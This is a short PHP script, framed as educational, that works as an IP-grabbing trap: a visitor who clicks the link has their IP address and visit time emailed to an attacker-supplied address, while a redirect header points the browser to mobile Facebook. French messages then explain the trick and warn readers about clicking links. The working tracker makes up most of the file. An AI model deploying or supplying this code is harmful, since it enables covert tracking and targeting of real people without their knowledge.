<?php
/*
-----------------------------------------------------------------------------------
| This script was created by Johnny (not real name)                                |
-----------------------------------------------------------------------------------
| Contact : markzukerber5@gmail.com                                                |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
|                          DISCLAIMER !                                            |  
|                                                                                  |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
| I am not responsible if this script gets you in trouble of any kind.             |
-----------------------------------------------------------------------------------

****************IT IS FOR EDUCATIONAL PURPOSES ONLY*******************
*/

    include ( "function.php" );
 	$_email = "markzukerber5@gmail.com"; //replace markzukerber5@gmail.com by your own Email address 
 	header('Location: https://m.facebook.com/');
	$ip = get_ip();  
	$jour = date('d');
	$mois = date('m');
	$annee = date('Y');
	$heure = date('H');
	$minute = date('i');	
	$subject = "IP Tracking";
	//$message = "<table><tr><th>IP : </th><td>".$ip."</td></tr></table>";
	$message = "<h1>IP Tracking Infos : </h1>	<table><tr><th>IP : </th><td>".$ip.
	"</td></th></table><p>Date : "
	.$jour. "/".$mois."/".$annee." at ".$heure.":".$minute;
	$headers = 'MIME-VERSION: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=utf-8'. "\r\n";
	$headers .= 'FROM : IP';
	$headers .= 'Tracking'. $_email ."\r\n";
	echo $message;
	mail($_email, $subject, $message, $headers);
	echo "Cette application Web permet de vous piéger et d'obtenir votre adresse IP.
En effet, dès lors que vous cliquez sur le lien de l'application, votre adresse IP est directement renvoyé dans 
la boite Email de l'attaquant. Ce dernier peut donc utiliser cette adresse IP pour 
pirater votre ordinateur ou votre smartphone.<br/>"; 
echo "Conseil : Ne pas cliquer trop vite sur des liens !<br/>";
echo "Une des attaques classiques visant à tromper l'internaute pour lui voler des informations 
personnelles, consiste à l'inciter à cliquer sur un lien placé dans un message. Ce lien peut-être 
trompeur  et  malveillant.  Plutôt  que  de  cliquer  sur  celui-ci,  il  vaut  mieux  saisir  soi-même 
l'adresse du site dans  la barre d'adresse du navigateur. De nombreux problèmes seront ainsi 
évités."; 

?>
